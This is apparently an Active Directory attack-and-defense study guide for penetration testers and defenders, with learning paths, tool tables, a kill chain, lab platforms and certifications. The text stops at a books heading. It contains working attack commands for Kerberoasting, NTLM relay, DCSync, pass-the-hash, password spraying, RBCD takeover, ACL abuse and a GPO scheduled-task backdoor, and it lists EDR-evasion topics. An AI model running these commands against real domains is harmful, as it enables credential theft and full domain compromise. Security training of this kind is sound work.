# Active Directory Security

> **Elite-Level Active Directory Attack & Defense Knowledge Base**
> *From domain enumeration to enterprise compromise and defense*

**Last Updated**: January 2025
**Difficulty Range**: 🟢 Beginner → ⚫ Expert
**Target Audience**: Penetration Testers, Red Teamers, Security Researchers, SOC Analysts


---

## 🎯 Introduction

### What is Active Directory Security?

Active Directory (AD) is Microsoft's directory service for Windows domain networks, used by over 90% of Fortune 1000 companies. It serves as the authentication and authorization backbone for enterprise environments, managing users, computers, groups, and organizational resources.

**Why AD is a Critical Attack Surface**:
- Single point of authentication for entire enterprise networks
- Complex permission models create misconfigurations
- Legacy design decisions prioritize functionality over security
- Backwards compatibility maintains vulnerable protocols (NTLM, LM)
- Privilege escalation paths are often non-obvious
- Default configurations are rarely secure

**The Security Paradigm**:
- **Offensive Perspective**: AD environments contain numerous privilege escalation vectors, from Kerberos protocol weaknesses to ACL misconfigurations
- **Defensive Perspective**: Detecting AD attacks requires understanding normal vs. malicious authentication patterns, trust relationships, and permission structures
- **Intelligence Agency Approach**: NSA/CISA guidelines emphasize "assume breach" mentality, implementing tiered access models and continuous monitoring

### Scope of This Collection

This knowledge base covers the complete AD security lifecycle:
- **Reconnaissance & Enumeration**: Discovering domain structure, users, groups, trusts
- **Initial Access**: Exploiting weak credentials, services, and misconfigurations
- **Privilege Escalation**: Moving from standard user to Domain Admin
- **Lateral Movement**: Navigating across domain-joined systems
- **Persistence**: Maintaining long-term access through multiple mechanisms
- **Defense & Detection**: Blue team strategies, logging, and detection engineering

---

## 🗺️ Content Map

### Core Documents

| Document | Difficulty | MITRE ATT&CK Mapping | Description |
|----------|-----------|---------------------|-------------|
| [AD Enumeration](./ad-enumeration.md) | 🟢 Beginner | TA0007 (Discovery) | Comprehensive guide to domain reconnaissance techniques |
| [AD Attacks](./ad-attacks.md) | 🟡 Intermediate | TA0006 (Credential Access) | Kerberos attacks, NTLM relay, credential harvesting |
| [AD Lateral Movement](./ad-lateral-movement.md) | 🔴 Advanced | TA0008 (Lateral Movement) | Techniques for moving across domain systems |
| [AD Persistence](./ad-persistence.md) | 🔴 Advanced | TA0003 (Persistence) | Long-term access mechanisms and backdoor strategies |
| [AD Defense & Detection](./ad-defense.md) | 🟡 Intermediate | TA0009 (Collection) | Blue team detection, logging, and hardening |

### Document Interconnections

```
AD Enumeration (Foundation)
    ↓
AD Attacks (Exploitation)
    ↓
AD Lateral Movement (Expansion)
    ↓
AD Persistence (Maintaining Access)
    ↑
AD Defense & Detection (Blue Team - Applied to All Stages)
```

**Recommended Reading Order**:
1. Start with **AD Enumeration** to understand the domain landscape
2. Progress to **AD Attacks** for exploitation techniques
3. Study **AD Lateral Movement** for network expansion
4. Learn **AD Persistence** for maintaining access
5. Master **AD Defense & Detection** to understand blue team perspective

---

## 🎓 Learning Path

### 🟢 Beginner Level (0-3 Months)
**Time Investment**: 40-60 hours
**Goal**: Understand AD fundamentals and basic enumeration

#### Topics to Master
- **Active Directory Basics**
  - Domain Controllers, OUs, Groups, Users
  - LDAP protocol and directory structure
  - Group Policy Objects (GPOs) fundamentals
  - Kerberos vs. NTLM authentication flows

- **Basic Enumeration**
  - PowerView / SharpView usage
  - BloodHound data collection and analysis
  - LDAP queries and filters
  - SMB enumeration with CrackMapExec

- **Initial Access**
  - Password spraying concepts
  - AS-REP Roasting (accounts without Kerberos pre-auth)
  - Basic SMB relay understanding
  - Null session enumeration

#### Practical Exercises
```powershell
# Example: Basic domain enumeration
Get-NetDomain
Get-NetDomainController
Get-NetUser | select samaccountname, description
Get-NetGroup "Domain Admins" | Get-NetGroupMember
Get-NetComputer | select dnshostname, operatingsystem
```

#### Milestones
- [ ] Successfully enumerate AD domain using PowerView
- [ ] Collect and analyze BloodHound data
- [ ] Identify AS-REP roastable accounts
- [ ] Perform password spraying attack in lab
- [ ] Understand Kerberos ticket structure (TGT, TGS)

---

### 🟡 Intermediate Level (3-6 Months)
**Time Investment**: 80-120 hours
**Goal**: Execute common AD attacks and privilege escalation

#### Topics to Master
- **Kerberos Attacks**
  - Kerberoasting (TGS cracking)
  - AS-REP Roasting advanced techniques
  - Unconstrained delegation abuse
  - Constrained delegation exploitation
  - Resource-Based Constrained Delegation (RBCD)

- **NTLM Attacks**
  - NTLM relay to SMB/LDAP/HTTP
  - Drop the MIC attack
  - SMB signing bypass techniques
  - Responder/Inveigh usage

- **Credential Access**
  - LSASS dumping (Mimikatz, ProcDump)
  - DCSync attack
  - NTDS.dit extraction
  - Credential vault and DPAPI abuse

- **Privilege Escalation**
  - Token impersonation
  - Service account exploitation
  - Weak ACL/ACE abuse
  - GPO modification for privilege escalation

#### Practical Exercises
```bash
# Example: Kerberoasting attack
# 1. Request service tickets
GetUserSPNs.py -request -dc-ip 10.10.10.10 domain.local/user

# 2. Crack with Hashcat
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt

# Example: NTLM Relay attack
# Terminal 1: Setup relay
ntlmrelayx.py -tf targets.txt -smb2support -socks

# Terminal 2: Trigger authentication
Responder.py -I eth0 -wF
```

#### Milestones
- [ ] Successfully Kerberoast and crack service account
- [ ] Execute NTLM relay attack to gain code execution
- [ ] Perform DCSync to extract domain hashes
- [ ] Abuse constrained delegation for privilege escalation
- [ ] Identify and exploit weak ACLs with BloodHound

---

### 🔴 Advanced Level (6-12 Months)
**Time Investment**: 150-250 hours
**Goal**: Master complex AD attacks and evasion techniques

#### Topics to Master
- **Advanced Kerberos Exploitation**
  - Golden Ticket creation and usage
  - Silver Ticket for service persistence
  - Diamond Ticket technique (stealthy alternative)
  - S4U2Self and S4U2Proxy abuse
  - Cross-domain trust exploitation

- **ACL & Permission Abuse**
  - GenericAll, GenericWrite, WriteDACL exploitation
  - AddMember, ForceChangePassword abuse
  - WriteOwner privilege escalation
  - GPO-related ACL abuse
  - Computer object takeover

- **Trust Relationship Attacks**
  - Parent-child trust exploitation
  - External trust abuse
  - Forest trust attacks (SID filtering bypass)
  - Selective authentication bypass

- **Advanced Persistence**
  - DCShadow (AD replication abuse)
  - DSRM password abuse
  - AdminSDHolder persistence
  - Skeleton Key attacks
  - Custom SSP/AP injection

- **Defense Evasion**
  - Obfuscated command execution
  - In-memory execution techniques
  - AMSI bypass strategies
  - ETW patching
  - Credential Guard bypass research

#### Practical Exercises
```powershell
# Example: ACL abuse chain
# 1. Identify exploitation path in BloodHound
# 2. Add user to group with GenericAll
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'attacker' -Credential $Cred

# Example: Cross-forest trust attack
# 1. Enumerate trusts
Get-DomainTrust -Domain current.domain

# 2. Create inter-realm TGT
Rubeus.exe asktgt /user:user@current.domain /rc4:hash /domain:trusted.domain
```

#### Milestones
- [ ] Execute complete ACL abuse chain from BloodHound
- [ ] Successfully perform DCShadow attack
- [ ] Compromise domain via trust relationship
- [ ] Create and use Golden/Silver tickets
- [ ] Bypass modern EDR solutions in lab environment

---

### ⚫ Expert Level (12+ Months)
**Time Investment**: 300+ hours
**Goal**: Novel attack research, custom tooling, APT-level techniques

#### Topics to Master
- **Custom Tool Development**
  - C# offensive tool development (BOF, execute-assembly)
  - PowerShell AMSI/CLM bypass research
  - Custom Kerberos ticket manipulation
  - Direct system call implementations
  - Reflective DLL injection for AD tools

- **Advanced Evasion**
  - Userland hooking bypass
  - Kernel-level credential access
  - PsSetCreateProcessNotifyRoutine evasion
  - EDR telemetry manipulation
  - Signature-less persistence mechanisms

- **Attack Research**
  - Novel AD attack vector discovery
  - Certificate Services (AD CS) exploitation
  - Azure AD/Entra ID integration attacks
  - AD Federation Services (ADFS) compromise
  - Exchange integration vulnerabilities

- **Purple Team Operations**
  - Detection engineering for advanced attacks
  - SIEM rule development and tuning
  - Threat hunting for AD compromise
  - Custom logging and telemetry collection
  - Adversary emulation framework development

#### Milestones
- [ ] Develop custom AD attack tool/technique
- [ ] Publish security research or vulnerability
- [ ] Design and implement detection logic for advanced attacks
- [ ] Build complete adversary emulation framework
- [ ] Achieve recognition in AD security community

---

## 🛠️ Essential Tools

### Enumeration & Reconnaissance

| Tool | Language | Difficulty | Primary Use | OPSEC Rating |
|------|----------|-----------|-------------|--------------|
| **BloodHound** | JavaScript/C# | 🟢 | Graphical AD relationship mapping | 🟡 Medium |
| **SharpHound** | C# | 🟢 | BloodHound data collector | 🟡 Medium |
| **ADRecon** | PowerShell | 🟢 | Comprehensive AD enumeration | 🟢 Low Detection |
| **PingCastle** | C# | 🟢 | AD security assessment (Blue Team) | 🟢 Safe |
| **PowerView** | PowerShell | 🟡 | AD enumeration and abuse | 🔴 High Detection |
| **SharpView** | C# | 🟡 | PowerView in C# | 🟡 Medium |
| **ldapdomaindump** | Python | 🟢 | LDAP enumeration via LDAP | 🟢 Low Detection |
| **ADExplorer** | GUI | 🟢 | Browse AD like filesystem (Sysinternals) | 🟢 Safe |

**Installation & Usage**:
```bash
# BloodHound setup (Kali Linux)
sudo apt install bloodhound neo4j

# SharpHound collection
.\SharpHound.exe -c All -d domain.local --zipfilename output.zip

# PowerView enumeration
Import-Module .\PowerView.ps1
Get-DomainUser -Properties samaccountname,description
Get-DomainComputer -Properties dnshostname,operatingsystem
```

---

### Exploitation & Attack Tools

| Tool | Language | Difficulty | Primary Use | Key Features |
|------|----------|-----------|-------------|--------------|
| **Rubeus** | C# | 🟡 | Kerberos abuse toolkit | AS-REP roast, Kerberoast, ticket manipulation |
| **Mimikatz** | C/C++ | 🟡 | Credential extraction | LSASS dump, DCSync, Golden/Silver tickets |
| **Impacket** | Python | 🟡 | Network protocol toolkit | secretsdump, psexec, GetUserSPNs |
| **CrackMapExec (NetExec)** | Python | 🟡 | Post-exploitation framework | Credential spraying, SMB relay, enumeration |
| **Responder** | Python | 🟢 | LLMNR/NBT-NS poisoning | Capture NTLM hashes |
| **ntlmrelayx** | Python | 🔴 | NTLM relay attacks | Relay to SMB/LDAP/HTTP |
| **Coercer** | Python | 🔴 | Force authentication | Trigger NTLM auth from targets |
| **ADModule** | PowerShell | 🟢 | Microsoft AD PowerShell | Legitimate MS cmdlets |

**Common Attack Workflows**:
```bash
# Kerberoasting workflow
# 1. Enumerate SPNs
GetUserSPNs.py -request -dc-ip 10.10.10.10 domain.local/user:password

# 2. Crack hashes
hashcat -m 13100 spn_hashes.txt wordlist.txt --force

# NTLM Relay attack
# 1. Setup relay (disable SMB/HTTP in Responder)
sudo ntlmrelayx.py -tf targets.txt -smb2support

# 2. Capture/relay with Responder
sudo responder -I eth0 -wF

# DCSync attack
secretsdump.py 'domain.local/user:password@10.10.10.10' -just-dc
```

---

### Post-Exploitation & Lateral Movement

| Tool | Type | Difficulty | Use Case |
|------|------|-----------|----------|
| **PowerView** | Enumeration | 🟡 | Domain reconnaissance from compromised host |
| **PowerUpSQL** | SQL Attacks | 🔴 | SQL Server enumeration and exploitation |
| **SharpGPOAbuse** | GPO Abuse | 🔴 | Exploit GPO permissions |
| **Certify** | AD CS | 🔴 | Certificate Services enumeration/abuse |
| **Whisker** | Shadow Credentials | 🔴 | Add msDS-KeyCredentialLink for auth |
| **PrivExchange** | Exchange | 🔴 | Exchange to DA privilege escalation |
| **ADCSPwn** | AD CS | 🔴 | Automated AD CS exploitation |

---

### Defense & Detection Tools

| Tool | Purpose | Deployment | Difficulty |
|------|---------|-----------|-----------|
| **Microsoft Defender for Identity** | Behavioral detection | Cloud/On-prem | 🟡 |
| **BloodHound CE** | Attack path analysis | On-prem | 🟢 |
| **PingCastle** | AD security audit | On-prem | 🟢 |
| **Purple Knight** | AD security posture | On-prem | 🟢 |
| **Splunk/Elastic** | SIEM for AD logs | Enterprise | 🔴 |
| **Sysmon** | Enhanced Windows logging | Endpoints | 🟡 |
| **Sigma Rules** | Detection logic | SIEM-agnostic | 🟡 |
| **Velociraptor** | Endpoint visibility | Enterprise | 🔴 |

**Critical Log Sources**:
- **Event ID 4624**: Successful logon (identify lateral movement)
- **Event ID 4625**: Failed logon (detect password spraying)
- **Event ID 4768/4769**: Kerberos TGT/TGS requests (Kerberoasting)
- **Event ID 4776**: NTLM authentication (relay attacks)
- **Event ID 5136**: Directory Service Changes (ACL modifications)

---

## ⚔️ Attack Kill Chain

### Phase 1: Reconnaissance
**Objective**: Gather information about target AD environment

**Techniques**:
- OSINT on domain structure (LinkedIn, DNS records)
- Public-facing services enumeration (OWA, ADFS, VPN)
- Email format identification for password spraying
- User enumeration via timing attacks or Kerberos

**Tools**: LinkedIn scraping, theHarvester, Kerbrute

**MITRE ATT&CK**: T1589, T1590, T1591, T1592, T1593, T1594, T1595, T1596, T1597, T1598

---

### Phase 2: Enumeration (Post-Initial Access)
**Objective**: Map AD environment, identify privilege escalation paths

**Techniques**:
- Domain user/group/computer enumeration
- BloodHound collection and analysis
- Identify SPNs for Kerberoasting
- Enumerate GPOs and ACLs
- Trust relationship discovery
- Identify delegation configurations

**Tools**: BloodHound, PowerView, ADRecon, ldapdomaindump

**MITRE ATT&CK**: T1087, T1069, T1482, T1201, T1018

**Example Enumeration Script**:
```powershell
# Comprehensive PowerView enumeration
Import-Module .\PowerView.ps1

# Domain information
Get-NetDomain
Get-NetDomainController
Get-DomainPolicy

# Users
Get-NetUser | select samaccountname,description,pwdlastset,admincount
Get-NetUser -SPN | select serviceprincipalname  # Kerberoastable

# Groups
Get-NetGroup | select name,description
Get-NetGroupMember "Domain Admins"
Get-NetGroupMember "Enterprise Admins"

# Computers
Get-NetComputer | select dnshostname,operatingsystem,lastlogon
Get-NetComputer -Unconstrained  # Unconstrained delegation
Get-NetComputer -TrustedToAuth  # Constrained delegation

# ACLs
Find-InterestingDomainAcl -ResolveGUIDs

# Trusts
Get-NetDomainTrust
Get-NetForestTrust
```

---

### Phase 3: Initial Access
**Objective**: Gain authenticated access to AD domain

**Techniques**:
- Password spraying against identified users
- AS-REP Roasting (accounts without pre-auth)
- LLMNR/NBT-NS poisoning
- Exploiting public-facing applications
- Phishing for credentials
- Exploiting misconfigurations (null sessions, anonymous LDAP)

**Tools**: Rubeus, GetNPUsers.py, Responder, Hydra, CrackMapExec

**MITRE ATT&CK**: T1078, T1110, T1557, T1566

**Safe Password Spray Example**:
```bash
# Using CrackMapExec (controlled spray to avoid lockout)
crackmapexec smb 10.10.10.10 -u users.txt -p 'Summer2024!' --continue-on-success

# Using Rubeus (Kerberos-based spray)
.\Rubeus.exe brute /users:users.txt /passwords:passwords.txt /domain:domain.local /outfile:valid.txt
```

---

### Phase 4: Privilege Escalation
**Objective**: Elevate from standard user to high-privilege account

**Common Escalation Paths**:

1. **Kerberoasting → Hash Cracking → Service Account Compromise**
   ```bash
   GetUserSPNs.py -request -dc-ip 10.10.10.10 domain.local/user:password
   hashcat -m 13100 hash.txt wordlist.txt
   ```

2. **ACL Abuse → Add to Privileged Group**
   ```powershell
   # Identify path in BloodHound
   Add-DomainGroupMember -Identity 'Domain Admins' -Members 'attacker'
   ```

3. **Unconstrained Delegation → TGT Capture**
   ```bash
   # Monitor unconstrained delegation system
   Rubeus.exe monitor /interval:5 /filteruser:target_admin
   ```

4. **Constrained Delegation → Service Impersonation**
   ```bash
   # Request TGT and impersonate admin
   getST.py -spn 'cifs/target.domain.local' -impersonate Administrator domain.local/service_account:password
   ```

5. **Resource-Based Constrained Delegation (RBCD)**
   ```powershell
   # Add msDS-AllowedToActOnBehalfOfOtherIdentity
   $ComputerSid = Get-DomainComputer attacker_machine -Properties objectsid | Select -Expand objectsid
   $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
   Set-DomainObject target_computer -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SD}
   ```

**MITRE ATT&CK**: T1068, T1134, T1484, T1558

---

### Phase 5: Lateral Movement
**Objective**: Expand access across domain systems

**Techniques**:
- Pass-the-Hash (PTH) with NTLM hashes
- Pass-the-Ticket (PTT) with Kerberos tickets
- Overpass-the-Hash (PTH + Kerberos)
- PSExec, WMI, WinRM remote execution
- DCOM exploitation
- RDP with stolen credentials
- Golden/Silver ticket usage

**Tools**: Impacket (psexec.py, wmiexec.py), CrackMapExec, Rubeus, Mimikatz

**MITRE ATT&CK**: T1021, T1550, T1570

**Lateral Movement Examples**:
```bash
# Pass-the-Hash with CrackMapExec
crackmapexec smb 10.10.10.0/24 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:hash -x "whoami"

# PSExec with Impacket
psexec.py domain.local/user:password@10.10.10.10

# Pass-the-Ticket
# Export ticket
Rubeus.exe dump /luid:0x123456 /nowrap

# Import and use ticket
Rubeus.exe ptt /ticket:base64_ticket
```

---

### Phase 6: Persistence
**Objective**: Maintain long-term access to domain

**Persistence Mechanisms**:

| Technique | Stealthiness | Recovery Difficulty | Privilege Required |
|-----------|-------------|---------------------|-------------------|
| Golden Ticket | 🔴 High | ⚫ Very Hard | Domain Admin |
| Silver Ticket | 🟡 Medium | 🔴 Hard | Service Account Hash |
| Skeleton Key | 🟡 Medium | 🟢 Easy (Reboot clears) | Domain Admin |
| DCShadow | ⚫ Very High | ⚫ Very Hard | Domain Admin |
| AdminSDHolder | 🟡 Medium | 🔴 Hard | Domain Admin |
| DSRM Password | 🔴 High | 🔴 Hard | Domain Admin |
| ACL Backdoor | 🔴 High | 🟡 Medium | Write DACL Permission |
| GPO Backdoor | 🟡 Medium | 🟡 Medium | GPO Modification Rights |

**MITRE ATT&CK**: T1098, T1136, T1197, T1484, T1543, T1547, T1574, T1556, T1558

---

### Phase 7: Defense Evasion
**Objective**: Avoid detection by security controls

**Evasion Techniques**:
- **AMSI Bypass**: Disable PowerShell script scanning
- **ETW Patching**: Disable Event Tracing for Windows
- **Obfuscation**: Encode/encrypt payloads
- **In-Memory Execution**: Avoid disk-based artifacts
- **Living off the Land (LOLBins)**: Use legitimate Windows tools
- **Process Injection**: Hide in legitimate processes
- **Timestomping**: Modify file timestamps

**Modern EDR Evasion Considerations**:
- Direct system calls bypass userland hooks
- PPL (Protected Process Light) bypass required for LSASS access on modern systems
- Credential Guard requires kernel-level techniques
- Behavioral detection requires understanding of baselines

**MITRE ATT&CK**: T1027, T1055, T1070, T1112, T1140, T1480, T1497, T1562, T1564, T1601, T1620

---

## 🔑 Key Concepts

### Kerberos Authentication Protocol

**Overview**: Kerberos is a network authentication protocol using tickets to prove identity without transmitting passwords.

**Key Components**:
- **KDC (Key Distribution Center)**: Domain Controller handling authentication
- **TGT (Ticket Granting Ticket)**: Proof of authentication, encrypted with krbtgt hash
- **TGS (Ticket Granting Service)**: Service-specific ticket for accessing resources
- **PAC (Privilege Attribute Certificate)**: Contains user's group memberships

**Authentication Flow**:
```
1. User → KDC: AS-REQ (Authentication Service Request) with encrypted timestamp
2. KDC → User: AS-REP (TGT encrypted with krbtgt hash)
3. User → KDC: TGS-REQ (request service ticket using TGT)
4. KDC → User: TGS-REP (service ticket encrypted with service account hash)
5. User → Service: AP-REQ (present service ticket)
6. Service → User: AP-REP (optional mutual authentication)
```

**Attack Surface**:
- **AS-REP Roasting**: Accounts with "Do not require Kerberos pre-authentication" can be requested without valid credentials
- **Kerberoasting**: Service tickets (TGS) are encrypted with service account password hash
- **Golden Ticket**: Forged TGT using compromised krbtgt hash
- **Silver Ticket**: Forged TGS using compromised service account hash
- **Unconstrained Delegation**: Systems can impersonate any user after they authenticate
- **Constrained Delegation**: Limited impersonation capabilities but exploitable

---

### NTLM Authentication Protocol

**Overview**: Legacy challenge-response authentication protocol, still widely used for backwards compatibility.

**Authentication Flow**:
```
1. Client → Server: NEGOTIATE_MESSAGE
2. Server → Client: CHALLENGE_MESSAGE (8-byte random challenge)
3. Client → Server: AUTHENTICATE_MESSAGE (response to challenge)
```

**Security Weaknesses**:
- No mutual authentication (server doesn't prove identity)
- Susceptible to relay attacks
- Weaker cryptography than Kerberos
- Pass-the-Hash allows authentication with hash alone

**Attack Vectors**:
- **NTLM Relay**: Capture NTLM authentication and relay to different service
- **Pass-the-Hash**: Use NTLM hash directly without cracking
- **Responder Poisoning**: Capture hashes via LLMNR/NBT-NS poisoning
- **Drop the MIC**: Remove message integrity check to downgrade protection

---

### Trust Relationships

**Trust Types**:

| Trust Type | Direction | Transitivity | Use Case |
|-----------|-----------|--------------|----------|
| **Parent-Child** | Two-way | Transitive | Automatic in forest |
| **Tree-Root** | Two-way | Transitive | Multiple trees in forest |
| **External** | One or Two-way | Non-transitive | Between different forests |
| **Forest** | One or Two-way | Transitive | Complete forest trust |
| **Shortcut** | One or Two-way | Transitive | Optimization in large forests |
| **Realm** | One or Two-way | Transitive/Non-transitive | Windows ↔ non-Windows |

**Attack Implications**:
- **SID Filtering**: Security boundary between forests (can be bypassed in some scenarios)
- **Selective Authentication**: Requires explicit permission for cross-domain access
- **Foreign Security Principals**: Groups from trusted domains in local groups
- **Trust Key Compromise**: Allows forging inter-realm TGTs

**Enumeration**:
```powershell
# Enumerate trusts
Get-DomainTrust
Get-NetForestTrust

# Map trust relationships
Invoke-MapDomainTrust
```

---

### ACLs and Permissions

**Access Control Model**:
- **DACL (Discretionary Access Control List)**: Who can access an object
- **ACE (Access Control Entry)**: Individual permission entry in DACL
- **SACL (System Access Control List)**: Auditing configuration

**Dangerous Permissions**:

| Permission | Object Types | Exploitation |
|-----------|-------------|--------------|
| **GenericAll** | User, Group, Computer | Full control - can modify any property |
| **GenericWrite** | User, Group | Modify most properties, add to groups |
| **WriteOwner** | Any | Change object owner to attacker |
| **WriteDACL** | Any | Modify permissions, grant self GenericAll |
| **ForceChangePassword** | User | Reset user password without knowing current |
| **AddMember** | Group | Add attacker to privileged groups |
| **AllExtendedRights** | User | Includes ForceChangePassword |

**BloodHound Attack Paths**:
```cypher
// Find shortest path to Domain Admins
MATCH (n:User {name:"ATTACKER@DOMAIN.LOCAL"}), (m:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}), p=shortestPath((n)-[*1..]->(m)) RETURN p

// Find users with DCSync rights
MATCH (n:User)-[:MemberOf*1..]->(g:Group)-[:GetChanges|GetChangesAll]->(d:Domain) RETURN n

// Find kerberoastable users
MATCH (u:User {hasspn:true}) RETURN u
```

---

### Group Policy Objects (GPOs)

**GPO Hierarchy**:
1. Local Computer Policy
2. Site-level GPOs
3. Domain-level GPOs
4. OU-level GPOs (nested OUs = later application)

**Security Implications**:
- **GPO Modification**: Add scheduled tasks, scripts, registry keys for persistence
- **GPO Delegation**: Weak permissions allow unauthorized modifications
- **Restricted Groups**: Can add users to local administrators
- **Script Execution**: Startup/shutdown/logon/logoff scripts run with SYSTEM

**Attack Examples**:
```powershell
# Enumerate GPOs
Get-NetGPO | select displayname, whenchanged

# Find GPOs with specific settings
Get-NetGPO -ComputerIdentity target_computer

# Abuse GPO permissions with SharpGPOAbuse
SharpGPOAbuse.exe --AddComputerTask --TaskName "Backdoor" --Author "IT" --Command "cmd.exe" --Arguments "/c powershell.exe -encoded BASE64" --GPOName "Default Domain Policy"
```

---

### Delegation Mechanisms

**Unconstrained Delegation**:
- Server can impersonate users to any service
- Stores user's TGT in memory
- **Attack**: Force high-privilege user to authenticate, extract TGT
- **Detection**: Event ID 4624 (Logon Type 3) to unconstrained delegation systems

**Constrained Delegation**:
- Limited to specific services (SPN list)
- Uses S4U2Self and S4U2Proxy Kerberos extensions
- **Attack**: Impersonate any user to allowed services
- **Configuration**: `msDS-AllowedToDelegateTo` attribute

**Resource-Based Constrained Delegation (RBCD)**:
- Configured on resource (reverse of constrained delegation)
- Uses `msDS-AllowedToActOnBehalfOfOtherIdentity`
- **Attack**: If you have write access, add own computer account for delegation
- **Advantage**: No domain admin required, only write access to target

**Example Attack Flow**:
```bash
# 1. Add computer account (or use existing)
addcomputer.py -computer-name 'ATTACKER$' -computer-pass 'Password123' domain.local/user:password

# 2. Modify target's RBCD attribute
rbcd.py -delegate-from 'ATTACKER$' -delegate-to 'TARGET$' -action write domain.local/user:password

# 3. Request ticket and impersonate
getST.py -spn 'cifs/target.domain.local' -impersonate Administrator domain.local/ATTACKER$:Password123

# 4. Use ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass target.domain.local
```

---

### AD Certificate Services (AD CS)

**Overview**: PKI implementation in AD environments, increasingly targeted attack surface.

**Certificate Templates**: Define certificate properties and enrollment permissions

**Attack Vectors** (ESC1-ESC8+):
- **ESC1**: Misconfigured certificate templates allow SAN specification
- **ESC2**: Any Purpose EKU or No EKU
- **ESC3**: Enrollment agent templates
- **ESC4**: Vulnerable ACLs on certificate templates
- **ESC6**: EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled
- **ESC7**: Vulnerable CA permissions
- **ESC8**: NTLM relay to HTTP enrollment endpoints

**Tools**:
- **Certify**: Enumerate and abuse AD CS misconfigurations
- **Certipy**: Python-based AD CS exploitation
- **ADCSPwn**: Automated exploitation framework

```bash
# Enumerate vulnerable templates
Certify.exe find /vulnerable

# Request certificate with arbitrary SAN
Certify.exe request /ca:CA-SERVER\CA-NAME /template:VulnTemplate /altname:administrator

# Convert PFX to TGT
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:certpass
```

---

## 🧪 Practice Environments

### Recommended Lab Platforms

#### 🟢 Beginner-Friendly

**TryHackMe - AD Learning Path**
- **Cost**: £8/month subscription
- **Content**: Structured AD learning rooms
- **Difficulty**: Progressive from basics to intermediate
- **Highlights**:
  - "Attacking Active Directory" path
  - "Attacktive Directory" room
  - "Post-Exploitation Basics" room
- **Time Investment**: 20-40 hours
- **URL**: https://tryhackme.com

**PentesterLab - Active Directory Track**
- **Cost**: €20/month
- **Content**: Guided AD exploitation exercises
- **Difficulty**: Beginner to intermediate
- **Highlights**: Step-by-step walkthroughs
- **URL**: https://pentesterlab.com

---

#### 🟡 Intermediate Practice

**HackTheBox - Active Directory Machines**
- **Cost**: Free tier available, €14/month VIP
- **Content**: Realistic AD environments
- **Recommended Boxes**:
  - 🟢 Forest (Easy) - AS-REP roasting, Exchange exploitation
  - 🟡 Sauna (Easy) - AS-REP, DCSync
  - 🟡 Active (Easy) - GPP passwords, Kerberoasting
  - 🟡 Cascade (Medium) - Enumeration, TightVNC password
  - 🔴 Resolute (Medium) - Multiple AD attack vectors
  - 🔴 Monteverde (Medium) - Azure AD integration
- **Pro Labs**:
  - RastaLabs (Advanced AD environment)
  - Offshore (APT simulation)
- **URL**: https://hackthebox.com

**Proving Grounds - AD Machines**
- **Cost**: $19/month
- **Content**: OSCP-style AD challenges
- **Difficulty**: Intermediate to advanced
- **URL**: https://offensive-security.com/labs/

---

#### 🔴 Advanced Environments

**GOAD (Game of Active Directory)**
- **Cost**: Free (self-hosted)
- **Setup**: Complex, multiple VMs required
- **Content**: Realistic multi-domain forest with intentional vulnerabilities
- **Architecture**:
  - 5 domains across 2 forests
  - Multiple domain controllers
  - Various trust relationships
  - SQL servers, workstations
- **Attack Vectors**: 100+ different exploitation paths
- **Requirements**: 64GB+ RAM recommended
- **Time Investment**: 80-200 hours to fully compromise
- **URL**: https://github.com/Orange-Cyberdefense/GOAD

**CRTP/CRTE Lab Environments**
- **Cost**: Included with certification ($249-$449)
- **Provider**: Altered Security (formerly Pentester Academy)
- **Content**:
  - CRTP: Multi-forest AD environment
  - CRTE: Advanced red team lab
- **Duration**: 30-60 days lab access
- **URL**: https://alteredsecurity.com

---

#### ⚫ Expert-Level Research

**Custom Lab Building**
- **Tools**:
  - AutomatedLab (PowerShell-based)
  - BadBlood (populate AD with realistic data)
  - GOAD (see above)
- **Advantages**:
  - Complete control over configurations
  - Test custom attack vectors
  - Integrate with detection tools
- **Investment**: Significant setup time, hardware

**DetectionLab**
- **Cost**: Free (self-hosted)
- **Purpose**: Purple team environment with logging
- **Components**:
  - AD domain with workstations
  - Splunk + Elasticsearch
  - Fleet osquery manager
  - Pre-configured logging
- **URL**: https://github.com/clong/DetectionLab

---

### Practice Methodology

**Structured Approach**:
1. **Enumerate thoroughly** before attacking
2. **Document all findings** (screenshots, commands, outputs)
3. **Map attack paths** using BloodHound
4. **Try multiple techniques** for same objective
5. **Practice OPSEC** even in labs (habit building)
6. **Attempt manual exploitation** before using automated tools
7. **Write custom scripts** to automate common tasks
8. **Study writeups** after completing challenges
9. **Build detection rules** for attacks you perform

---

## 🎓 Certifications

### Offensive Certifications

| Certification | Provider | Difficulty | Focus | Cost | Lab Access |
|--------------|----------|-----------|-------|------|-----------|
| **CRTP** | Altered Security | 🟡 Intermediate | AD enumeration & attacks | $249 | 30 days |
| **CRTE** | Altered Security | 🔴 Advanced | Red team AD tactics | $449 | 60 days |
| **PNPT** | TCM Security | 🟡 Intermediate | Practical pentest with AD | $399 | Unlimited |
| **OSCP** | Offensive Security | 🟡 Intermediate | General pentest (includes AD) | $1,649 | 90 days |
| **OSEP** | Offensive Security | 🔴 Advanced | Evasion techniques | $1,649 | 90 days |
| **CRTO** | Zero-Point Security | 🔴 Advanced | Red team ops | £399 | 48 hours |

---

### Defensive Certifications

| Certification | Provider | Focus | Relevance to AD |
|--------------|----------|-------|----------------|
| **GCDA** | GIAC | Defending Active Directory | 🔴 High |
| **GMON** | GIAC | Monitoring and Detection | 🟡 Medium |
| **Microsoft SC-200** | Microsoft | Security Operations Analyst | 🟡 Medium |

---

### Certification Recommendations by Career Path

**Red Team Operator**:
1. CRTP (foundation)
2. OSCP (general skills)
3. CRTE (advanced AD)
4. OSEP or CRTO (evasion)

**Penetration Tester**:
1. PNPT or CRTP
2. OSCP
3. CRTE (if specializing)

**Security Researcher**:
1. CRTP (understand attack surface)
2. CRTE (advanced techniques)
3. Focus on original research and CVE discovery

**Purple Team / Detection Engineer**:
1. CRTP (understand attacks)
2. GCDA (defensive focus)
3. GMON (detection engineering)

---

## 📚 Resources

### Essential Books

**Offensive Focus**:
